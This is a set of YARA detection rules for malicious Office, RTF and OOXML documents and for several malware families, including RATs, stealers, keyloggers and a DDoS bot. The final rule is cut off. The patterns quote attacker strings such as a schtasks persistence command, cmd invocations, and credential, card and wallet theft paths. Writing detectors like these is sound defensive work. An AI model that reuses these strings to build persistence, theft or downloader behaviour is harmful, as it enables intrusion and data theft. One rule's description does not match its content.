rule DITEKSHEN_INDICATOR_XML_OLE_Autoload_Document : FILE
{
	meta:
		description = "detects AutoLoad documents using OLE Object"
		author = "ditekSHen"
		id = "b3d682c3-641a-554a-8607-e99d07e9a57d"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L596-L606"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b262a9f8e82dea55afc26acac731827b64f52069a2bf314f716832b3dfc2c04f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "autoLoad=\"true\"" ascii
		$s2 = "/relationships/oleObject\"" ascii
		$s3 = "Target=\"../embeddings/oleObject" ascii

	condition:
		uint32( 0 ) == 0x6d783f3c and all of ( $s* )
}
rule DITEKSHEN_INDICATOR_XML_Squiblydoo_1 : FILE
{
	meta:
		description = "detects Squiblydoo variants extracted from exploit RTF documents."
		author = "ditekSHen"
		id = "cac326ab-cc31-59c1-bd12-285db1675695"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L608-L622"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b52ebd76dd4e60f6bd5cb19fed3a72b6aeb90dea95f0d1be61dcfff39ea674ae"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$slt = "<scriptlet" ascii
		$ws1 = "CreateObject(\"WScript\" & \".Shell\")" ascii
		$ws2 = "CreateObject(\"WScript.Shell\")" ascii
		$ws3 = "ActivexObject(\"WScript.Shell\")" ascii
		$r1 = "[\"run\"]" nocase ascii
		$r2 = ".run \"cmd" nocase ascii
		$r3 = ".run chr(" nocase ascii

	condition:
		( uint32( 0 ) == 0x4d583f3c or uint32( 0 ) == 0x6d783f3c ) and $slt and 1 of ( $ws* ) and 1 of ( $r* )
}
rule DITEKSHEN_INDICATOR_OLE_Suspicious_Reverse : FILE
{
	meta:
		description = "detects OLE documents containing VB scripts with reversed suspicious strings"
		author = "ditekSHen"
		id = "a7f4d18d-add6-5df2-9a8c-f88d8e3766da"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L624-L644"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "04950549eede23b7006103539f20437713a54138c073d9805048392ea0a3df2a"
		score = 65
		quality = 71
		tags = "FILE"

	strings:
		$vb = "\\VBE7.DLL" ascii
		$cmd1 = "CMD C:\\" nocase ascii
		$cmd2 = "CMD /c " nocase ascii
		$kw1 = "]rAHC[" nocase ascii
		$kw2 = "ekOVNI" nocase ascii
		$kw3 = "EcaLPEr" nocase ascii
		$kw4 = "TcEJBO-WEn" nocase ascii
		$kw5 = "eLbAirav-Teg" nocase ascii
		$kw6 = "ReveRSE(" nocase ascii
		$kw7 = "-JOIn" nocase ascii

	condition:
		uint16( 0 ) == 0xcfd0 and $vb and ( ( 1 of ( $cmd* ) and 1 of ( $kw* ) ) or ( 2 of ( $kw* ) ) )
}
rule DITEKSHEN_INDICATOR_OLE_Suspicious_Activex : FILE
{
	meta:
		description = "detects OLE documents with suspicious ActiveX content"
		author = "ditekSHen"
		id = "e4a74955-8519-561d-bb23-6469e7ae5aaa"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L646-L676"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d9a672b0eeccd93b4ae98fef45560490171f8fc16b712d1e0141fc0ef1d0e342"
		score = 65
		quality = 73
		tags = "FILE"

	strings:
		$vb = "\\VBE7.DLL" ascii
		$ax1 = "_Layout" ascii
		$ax2 = "MultiPage1_" ascii
		$ax3 = "_MouseMove" ascii
		$ax4 = "_MouseHover" ascii
		$ax5 = "_MouseLeave" ascii
		$ax6 = "_MouseEnter" ascii
		$ax7 = "ImageCombo21_Change" ascii
		$ax8 = "InkEdit1_GotFocus" ascii
		$ax9 = "InkPicture1_" ascii
		$ax10 = "SystemMonitor1_" ascii
		$ax11 = "WebBrowser1_" ascii
		$ax12 = "_Click" ascii
		$kw1 = "CreateObject" ascii
		$kw2 = "CreateTextFile" ascii
		$kw3 = ".SpawnInstance_" ascii
		$kw4 = "WScript.Shell" ascii
		$kw5 = { 43 68 72 [0-2] 41 73 63 [0-2] 4d 69 64 }
		$kw6 = { 43 68 [0-2] 72 24 28 40 24 28 22 26 48 }
		$kw7 = { 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 }

	condition:
		uint16( 0 ) == 0xcfd0 and $vb and 1 of ( $ax* ) and 2 of ( $kw* )
}
rule DITEKSHEN_INDICATOR_OLE_Remotetemplate
{
	meta:
		description = "Detects XML relations where an OLE object is refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "fbf40436-fc0a-5e55-89ac-5e1dd93e1833"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L691-L702"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "80cc5b1a8a8899f632401956055374d265c734449e56ffeee5f0ba4911050f36"
		score = 75
		quality = 75
		tags = ""

	strings:
		$olerel = "relationships/oleObject" ascii
		$target1 = "Target=\"http" ascii
		$target2 = "Target=\"file" ascii
		$mode = "TargetMode=\"External" ascii

	condition:
		$olerel and $mode and 1 of ( $target* )
}
rule DITEKSHEN_INDICATOR_RTF_Malver_Objects : FILE
{
	meta:
		description = "Detects RTF documents with non-standard version and embeding one of the object mostly observed in exploit documents."
		author = "ditekSHen"
		id = "2d9d80e0-473e-5aac-a576-8f0002e120e2"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L704-L718"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "69136fb8ba180f6f86e569471bcefe8f55c61af73c66ebd6062ba7369aee9a72"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii

	condition:
		uint32( 0 ) == 0x74725c7b and ( ( not uint8( 4 ) == 0x66 or not uint8( 5 ) == 0x31 or not uint8( 6 ) == 0x5c ) and 1 of ( $obj* ) )
}
rule DITEKSHEN_INDICATOR_PPT_Mastermana : FILE
{
	meta:
		description = "Detects known malicious pattern (MasterMana) in PowerPoint documents."
		author = "ditekSHen"
		id = "8e9b8185-6211-54c6-946d-b16f2226312a"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L720-L740"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f8169e63b22fbbd48de9a63ff228d9d9fb105e95d2ea8a37c0993493515e8b2e"
		score = 75
		quality = 71
		tags = "FILE"

	strings:
		$a1 = "auto_close" ascii nocase
		$a2 = "autoclose" ascii nocase
		$a3 = "auto_open" ascii nocase
		$a4 = "autoopen" ascii nocase
		$vb1 = "\\VBE7.DLL" ascii
		$vb2 = { 41 74 74 72 69 62 75 74 ?? 65 20 56 42 5f 4e 61 6d ?? 65 }
		$clsid = "000204EF-0000-0000-C000-000000000046" wide nocase
		$i1 = "@j.mp/" ascii wide
		$i2 = "j.mp/" ascii wide
		$i3 = "\\pm.j\\\\:" ascii wide
		$i4 = ".zz.ht/" ascii wide
		$i5 = "/pm.j@" ascii wide
		$i6 = "\\pm.j@" ascii wide

	condition:
		uint16( 0 ) == 0xcfd0 and 1 of ( $i* ) and $clsid and 1 of ( $a* ) and 1 of ( $vb* )
}
rule DITEKSHEN_INDICATOR_XML_Webrelframe_Remotetemplate : FILE
{
	meta:
		description = "Detects XML web frame relations refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "724650db-8d58-5e73-92e7-287890babc3b"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L742-L752"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "fbe209e31ddb4369de02b6e91bf65f0588089c7b838dcf80f182248790b59e20"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$target1 = "/frame\" Target=\"http" ascii nocase
		$target2 = "/frame\" Target=\"file" ascii nocase
		$mode = "TargetMode=\"External" ascii

	condition:
		uint32( 0 ) == 0x6d783f3c and ( 1 of ( $target* ) and $mode )
}
rule DITEKSHEN_INDICATOR_RTF_Embedded_Excel_Urldownloadtofile : FILE
{
	meta:
		description = "Detects RTF documents that embed Excel documents for detection evation."
		author = "ditekSHen"
		id = "39b8723c-1755-5e2f-8fb2-cca5e9eef915"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L814-L840"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9416664683c249a9dc2b3d506d9dea7067a638cc4ee5ef7138e5b33a8fcd2b96"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$clsid1 = "2008020000000000c000000000000046" ascii nocase
		$obj1 = "\\objhtml" ascii
		$obj2 = "\\objdata" ascii
		$obj3 = "\\objupdate" ascii
		$obj4 = "\\objemb" ascii
		$obj5 = "\\objautlink" ascii
		$obj6 = "\\objlink" ascii
		$ole1 = { d0 cf 11 e0 a1 b1 1a e1 }
		$ole2 = "d0cf11e0a1b11ae1" ascii nocase
		$ole3 = "64306366313165306131623131616531" ascii
		$ole4 = "640a300a630a660a310a310a650a300a610a310a620a310a310a610a650a31"
		$ole5 = { 64 30 63 66 [0-2] 31 31 65 30 61 31 62 31 31 61 65 31 }
		$ole6 = "D0cf11E" ascii nocase
		$s1 = "55524c446f776e6c6f6164546f46696c6541" ascii nocase
		$s2 = "55524c4d4f4e" ascii nocase

	condition:
		uint32( 0 ) == 0x74725c7b and ( 1 of ( $clsid* ) and 1 of ( $obj* ) and 1 of ( $ole* ) and 1 of ( $s* ) )
}
rule DITEKSHEN_INDICATOR_OLE_Excel4Macros_DL3 : FILE
{
	meta:
		description = "Detects OLE Excel 4 Macros documents acting as downloaders"
		author = "ditekSHen"
		id = "794cac49-e917-5282-8cbd-8ecf91a2dc9e"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L842-L860"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "83eaf60b900119b9fcd458e9e9dda119fd71785821bf282e9385031368ff9891"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$a1 = { 18 00 17 00 20 00 00 01 07 00 00 00 00 00 00 00 00 00 00 01 3a 00 }
		$a2 = { 18 00 17 00 aa 03 00 01 07 00 00 00 00 00 00 00 00 00 00 01 3a 00 }
		$a3 = { 18 00 21 00 20 00 00 01 12 00 00 00 00 00 00 00 00 00 01 3a ff }
		$a4 = { 18 00 17 00 20 00 00 01 07 00 00 00 00 00 00 00 00 00 00 02 3a 00 }
		$a5 = { 18 00 17 00 aa 03 00 01 07 00 00 00 00 00 00 00 00 00 00 02 3a 00 }
		$a6 = "auto_open" ascii nocase
		$a7 = "auto_close" ascii nocase
		$s1 = "* #,##0" ascii
		$s2 = "URLMon" ascii
		$s3 = "DownloadToFileA" ascii
		$s4 = "DllRegisterServer" ascii

	condition:
		uint16( 0 ) == 0xcfd0 and 1 of ( $a* ) and all of ( $s* ) and #s1 > 3
}
rule DITEKSHEN_INDICATOR_DOC_Phishingpatterns : FILE
{
	meta:
		description = "Detects OLE, RTF, PDF and OOXML (decompressed) documents with common phishing strings"
		author = "ditekSHen"
		id = "67372eb5-ed07-5062-a12e-9ad8c7070f0f"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L862-L883"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "50b6566cb18512f887c07576391eb492101f7534da3460d5f7740ee6f4cf707d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "PERFORM THE FOLLOWING STEPS TO PERFORM DECRYPTION" ascii nocase
		$s2 = "Enable Editing" ascii nocase
		$s3 = "Enable Content" ascii nocase
		$s4 = "WHY I CANNOT OPEN THIS DOCUMENT?" ascii nocase
		$s5 = "You are using iOS or Android, please use Desktop PC" ascii nocase
		$s6 = "You are trying to view this document using Online Viewer" ascii nocase
		$s7 = "This document was edited in a different version of" ascii nocase
		$s8 = "document are locked and will not" ascii nocase
		$s9 = "until the \"Enable\" button is pressed" ascii nocase
		$s10 = "This document created in online version of Microsoft Office" ascii nocase
		$s11 = "This document created in previous version of Microsoft Office" ascii nocase
		$s12 = "This document protected by Microsoft Office" ascii nocase
		$s13 = "This document encrypted by" ascii nocase
		$s14 = "document created in earlier version of microsoft office" ascii nocase

	condition:
		( uint16( 0 ) == 0xcfd0 or uint32( 0 ) == 0x74725c7b or uint32( 0 ) == 0x46445025 or uint32( 0 ) == 0x6d783f3c ) and 2 of them
}
rule DITEKSHEN_INDICATOR_OOXML_Excel4Macros_EXEC : FILE
{
	meta:
		description = "Detects OOXML (decompressed) documents with Excel 4 Macros XLM macrosheet"
		author = "ditekSHen"
		id = "674ef310-d3bc-5e15-862f-29aa111becb3"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L885-L898"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ab3994e4082390f65d030db0b898a20df1d7e4b0ca2fdedc7a9d0f1480fd0334"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "INDICATOR.OOXML.Excel4MacrosEXEC"

	strings:
		$ms = "<xm:macrosheet" ascii nocase
		$s1 = ">FORMULA.FILL(" ascii nocase
		$s2 = ">REGISTER(" ascii nocase
		$s3 = ">EXEC(" ascii nocase
		$s4 = ">RUN(" ascii nocase

	condition:
		uint32( 0 ) == 0x6d783f3c and $ms and ( 2 of ( $s* ) or ( $s3 ) )
}
rule DITEKSHEN_INDICATOR_OOXML_Excel4Macros_Autoopenhidden : FILE
{
	meta:
		description = "Detects OOXML (decompressed) documents with Excel 4 Macros XLM macrosheet auto_open and state hidden"
		author = "ditekSHen"
		id = "c5aab620-5254-5fc6-b236-4fe0f69cbd8e"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L900-L910"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a93d8aa7ac025a0c2e8a9ac833f6d4c3cd3769ffca3f87455f43411d0021e828"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "INDICATOR.OOXML.Excel4MacrosEXEC"

	strings:
		$s1 = "state=\"veryhidden\"" ascii nocase
		$s2 = "<definedName name=\"_xlnm.Auto_Open" ascii nocase

	condition:
		uint32( 0 ) == 0x6d783f3c and all of them
}
rule DITEKSHEN_INDICATOR_SUSPICOIUS_RTF_Encodedurl : FILE
{
	meta:
		description = "Detects executables calling ClearMyTracksByProcess"
		author = "ditekSHen"
		id = "6b3f0434-24b2-5ae8-a6fc-c0fdded4996f"
		date = "2020-11-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L930-L941"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cb791bb5e2af46ff9f1f07cef33bbd51edc44b2394d6f3eff31d39eaa5ff2a33"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "\\u-65431?\\u-65419?\\u-65419?\\u-65423?\\u-" ascii wide
		$s2 = "\\u-65432?\\u-65420?\\u-65420?\\u-65424?\\u-" ascii wide
		$s3 = "\\u-65433?\\u-65430?\\u-65427?\\u-65434?\\u-" ascii wide
		$s4 = "\\u-65434?\\u-65431?\\u-65428?\\u-65435?\\u-" ascii wide

	condition:
		uint32( 0 ) == 0x74725c7b and any of them
}
rule DITEKSHEN_MALWARE_Win_Isrstealer : FILE
{
	meta:
		description = "ISRStealer payload"
		author = "ditekSHen"
		id = "d6c3acdd-e881-5f97-8856-b7b60f56a1c2"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L112-L128"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "5dd030ab8122b5dd432168647c7a3465cb3593a326f68b4863a91d16587641e5"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.ISRStealer"

	strings:
		$s1 = "&password=" wide
		$s2 = "&pcname=" wide
		$s3 = "MSVBVM60.DLL" ascii
		$s4 = "MSVBVM60.DLL" wide
		$s5 = "Core Software For : Public" wide
		$s6 = "</Host>" wide
		$s7 = "</Pass>" wide
		$s8 = "/scomma" wide

	condition:
		( uint16( 0 ) == 0x5a4d and filesize < 4000KB and 6 of them ) or all of them
}
rule DITEKSHEN_MALWARE_Win_Limerat : FILE
{
	meta:
		description = "LimeRAT payload"
		author = "ditekSHen"
		id = "a4b85cad-97a8-514c-9380-f3e8ec95a44d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L152-L168"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "8ae35c5fa48773b93da0b76b238fc8dbaf19fdeb6fd81bf23842c5121d620116"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr" wide
		$s2 = "\\vboxhook.dll" fullword wide
		$s3 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide
		$s4 = "select CommandLine from Win32_Process where Name='{0}'" wide
		$s5 = "Minning..." fullword wide
		$s6 = "Regasm.exe" fullword wide
		$s7 = "Flood!" fullword wide
		$s8 = "Rans-Status" fullword wide
		$s9 = "cmd.exe /c ping 0" wide

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_MALWARE_Win_Arkei : FILE
{
	meta:
		description = "Detect Arkei infostealer variants"
		author = "ditekSHen"
		id = "d32a27bf-abb9-553c-9913-d675c340a5c5"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L210-L226"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "8a79bcc6ac94900c8a8913b2e81424bf900bbac416f44a91db6f208f23980155"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii wide
		$s2 = "/c taskkill /im " fullword ascii
		$s3 = "card_number_encrypted FROM credit_cards" ascii
		$s4 = "\\wallet.dat" ascii
		$s5 = "Arkei/" wide
		$s6 = "files\\passwords." ascii wide
		$s7 = "files\\cc_" ascii wide
		$s8 = "files\\autofill_" ascii wide
		$s9 = "files\\cookies_" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_MALWARE_Win_Firebirdrat : FILE
{
	meta:
		description = "Firebird/Hive RAT payload"
		author = "ditekSHen"
		id = "456ae70e-8004-5fb0-a4fd-ce7c0f4704f9"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L316-L339"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1c24e924171db1b99a3b03764f4551b6f4b6b1c9c6147b49dbc0651e85e9040c"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Firebird-HiveRAT"

	strings:
		$id1 = "Firebird Remote Administration Tool" fullword wide
		$id2 = "Welcome to Firebird! Your system is currently being monitored" wide
		$id3 = "Hive Remote Administration Tool" fullword wide
		$id4 = "Welcome to Hive! Your system is currently being monitored" wide
		$s1 = "REPLACETHESEKEYSTROKES" fullword wide
		$s2 = "_ENABLE_PROFILING" fullword wide
		$s3 = ": KeylogSubject" wide
		$s4 = "Firebird.CommandHandler" fullword wide
		$s5 = "webcamenabled" fullword ascii
		$s6 = "screenlogs" fullword ascii
		$s7 = "encryptedconnection" fullword ascii
		$s8 = "monitoron" fullword ascii
		$s9 = "screenGrab" fullword ascii
		$s10 = "TCP_TABLE_OWNER_PID_ALL" fullword ascii
		$s11 = "de4fuckyou" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 1 of ( $id* ) or 7 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Phoenix : FILE
{
	meta:
		description = "Phoenix/404KeyLogger keylogger payload"
		author = "ditekSHen"
		id = "62101881-9b5e-586d-8e1b-184787f25d6b"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L341-L367"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b2c2a4ffc36d708a121853fb0268e6dc85b3fe2cd58e05c8124cbef18e03ec0b"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Phoenix-Keylogger"

	strings:
		$s1 = "FirefoxPassReader" fullword ascii
		$s2 = "StartKeylogger" fullword ascii
		$s3 = "CRYPTPROTECT_" ascii
		$s4 = "Chrome_Killer" fullword ascii
		$s5 = "Clipboardlog.txt" fullword wide
		$s6 = "Leyboardlogs.txt" fullword wide
		$s7 = "Persistence'" wide
		$s8 = "set_HKB" fullword ascii
		$s9 = "loloa" fullword ascii
		$s10 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)" fullword wide
		$m1 = "- Screenshot -------|" ascii wide
		$m2 = "- Clipboard -------|" ascii wide
		$m3 = "- Logs -------|" ascii wide
		$m4 = "- Passwords -------|" ascii wide
		$m5 = "PSWD" ascii wide
		$m6 = "Screenshot |" ascii wide
		$m7 = "Logs |" ascii wide

	condition:
		( uint16( 0 ) == 0x5a4d and 6 of ( $s* ) or 3 of ( $m* ) ) or 9 of them
}
rule DITEKSHEN_MALWARE_Win_Backnet : FILE
{
	meta:
		description = "BackNet payload"
		author = "ditekSHen"
		id = "c53ef72f-4957-5ddb-b096-dcdb69cf900d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L369-L386"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c276f2b809caad680455fc4ca0a021887d4ff2c9114f05737542a1d3c5cca848"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.BackNet"

	strings:
		$s1 = "Slave.Commands." fullword ascii
		$s2 = "StartKeylogger" fullword ascii
		$s3 = "StopKeylogger" fullword ascii
		$s4 = "KeyLoggerCommand" fullword ascii
		$s5 = "get_keyLoggerManager" fullword ascii
		$s6 = "get_IgnoreMutex" fullword ascii
		$s7 = "ListProcesses" fullword ascii
		$s8 = "downloadurl" fullword wide
		$pdb = "\\BackNet-master\\Slave\\obj\\Release\\Slave.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( $pdb or all of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Acridrain : FILE
{
	meta:
		description = "AcidRain stealer payload"
		author = "ditekSHen"
		id = "9890c9e0-ce53-5f08-9077-c73a9e4ba29c"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L388-L401"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "11884073f4bf466503b07f297ae7fad188f79df148fcc7ca48827c7dbd07e211"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = { 43 6f 6f 6b 69 65 73 (5c|2e) }
		$s2 = { 74 65 6d 70 6c 6f 67 69 ?? }
		$s3 = { 74 65 6d 70 50 ?? 68 }
		$s4 = "Connecting to hostname: %s%s%s" fullword ascii
		$s5 = "Found bundle for host %s: %p [%s]" fullword ascii
		$s6 = "encryptedUsernamencryptedPassworERROR Don't copy string" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule DITEKSHEN_MALWARE_Linux_Chachaddos : FILE
{
	meta:
		description = "ChaChaDDoS variant of XorDDoS payload"
		author = "ditekSHen"
		id = "78a5cf3a-0e84-59bd-a936-bd335647e3d0"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L403-L418"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2bf99771046650820f02a24d5bd825afeacd03d1e865b05d8563a3ef74d521fb"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "[kworker/1:1]" ascii
		$x2 = "-- LuaSocket toolkit." ascii
		$x3 = "/etc/resolv.conf" ascii
		$x4 = "\"macaddress=\" .. DEVICE_MAC .. \"&device=\" .." ascii
		$x5 = "easy_attack_dns" ascii
		$x6 = "easy_attack_udp" ascii
		$x7 = "easy_attack_syn" ascii
		$x8 = "syn_probe" ascii

	condition:
		uint16( 0 ) == 0x457f and 6 of them
}
rule DITEKSHEN_MALWARE_Multi_Exaramel : FILE
{
	meta:
		description = "Exaramel Windows/Linux backdoor payload"
		author = "ditekSHen"
		id = "014f10f3-4502-5719-93f6-4b2940f53876"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L420-L459"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e64383304bc913b07a2e63d61c81354b996c01171357005f4a28957d4d889599"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig1 = "MALWARE_Linux.Backdoor.Exaramel"
		clamav_sig2 = "MALWARE_Win.Backdoor.Exaramel"

	strings:
		$s1 = "vendor/golang_org/x/crypto/" ascii
		$s2 = "vendor/golang_org/x/net/http2" ascii
		$s3 = "vendor/golang_org/x/text/unicode" ascii
		$s4 = "vendor/golang_org/x/text/transform" ascii
		$s5 = "config.json" ascii
		$cmd1 = "App.Update" ascii
